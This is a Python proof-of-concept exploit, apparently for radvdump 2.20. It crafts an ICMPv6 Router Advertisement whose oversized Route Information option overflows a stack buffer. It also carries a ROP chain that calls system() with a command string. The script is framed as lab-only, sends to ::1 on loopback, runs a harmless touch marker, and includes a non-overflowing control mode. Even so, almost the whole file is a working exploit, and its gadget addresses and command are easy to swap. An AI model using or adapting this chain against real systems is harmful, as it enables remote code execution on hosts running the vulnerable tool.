#!/usr/bin/env python3
"""Lab-only: send one crafted ICMPv6 RA that attempts a benign ROP marker.

Never sends off 127.0.0.1 / ::1 on lo. Requires CAP_NET_RAW (sudo).
Addresses are those of the real 2.20 -O0 build launched under gdb with
disable-randomization on (recorded in evidence/layout-plain.out):

  &addr            = 0x7fffffffe220     saved RIP = &addr + 296
  rinfo slot       = &addr + 112
  pop rdi; ret     = 0x7ffff7d0f84b     (libc file offset 0x10f84b)
  system           = 0x7ffff7c58750
  exit             = 0x7ffff7c47ba0
  usage_str        = 0x55555555d010     (readable rinfo stand-in)
  command string   = &addr + 336 = 0x7fffffffe370

Modes:
  marker      length byte 60, full ROP chain, benign touch marker
  marker-safe RFC-conformant length byte 2 (no overflow) wire control
"""
import socket
import struct
import sys

ADDR = 0x7fffffffe220
RINFO = 0x55555555d010
POP_RDI_RET = 0x7ffff7d0f84b
SYSTEM = 0x7ffff7c58750
RET = 0x7ffff7d0f84c
EXIT = 0x7ffff7c47ba0
CMD_OFF = 336
CMD = b"/usr/bin/touch /tmp/radvdump2shell-marker\x00"


def ones_complement_sum(data):
    if len(data) % 2:
        data += b"\x00"
    total = 0
    for i in range(0, len(data), 2):
        total += (data[i] << 8) | data[i + 1]
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return total


def icmpv6_checksum(src, dst, payload):
    pseudo = src + dst + struct.pack("!I", len(payload)) + b"\x00\x00\x00\x3a"
    return (~ones_complement_sum(pseudo + payload)) & 0xFFFF


def build_ra(mode):
    ra = bytearray(struct.pack("!BBHBBHII", 134, 0, 0, 64, 0, 0, 0, 0))
    if mode == "marker":
        length_byte = 60              # optlen 480, copy 472, RA 496 < 1500
        prefix = bytearray([0x41] * 472)
        struct.pack_into("<Q", prefix, 112, RINFO)
        struct.pack_into("<Q", prefix, 296, POP_RDI_RET)
        struct.pack_into("<Q", prefix, 304, ADDR + CMD_OFF)
        struct.pack_into("<Q", prefix, 312, RET)
        struct.pack_into("<Q", prefix, 320, SYSTEM)
        struct.pack_into("<Q", prefix, 328, EXIT)
        prefix[CMD_OFF:CMD_OFF + len(CMD)] = CMD
    elif mode == "marker-safe":
        length_byte = 2               # optlen 16, copy 8, RFC 4191 conformant
        prefix = bytearray([0x41] * 8)
    else:
        raise ValueError(mode)

    option = struct.pack("!BBBBI", 24, length_byte, 0, 0, 0xFFFFFFFF) + bytes(prefix)
    assert len(option) == length_byte * 8, (len(option), length_byte * 8)
    ra.extend(option)
    src = dst = socket.inet_pton(socket.AF_INET6, "::1")
    struct.pack_into("!H", ra, 2, icmpv6_checksum(src, dst, bytes(ra)))
    return bytes(ra)


def main():
    if len(sys.argv) != 2:
        sys.exit("usage: send_marker.py marker|marker-safe")
    packet = build_ra(sys.argv[1])
    lo = socket.if_nametoindex("lo")
    s = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_ICMPV6)
    s.sendto(packet, ("::1", 0, 0, lo))
    s.close()
    print(f"sent {sys.argv[1]} RA: {len(packet)} bytes to ::1%lo (ifindex {lo})")


if __name__ == "__main__":
    main()
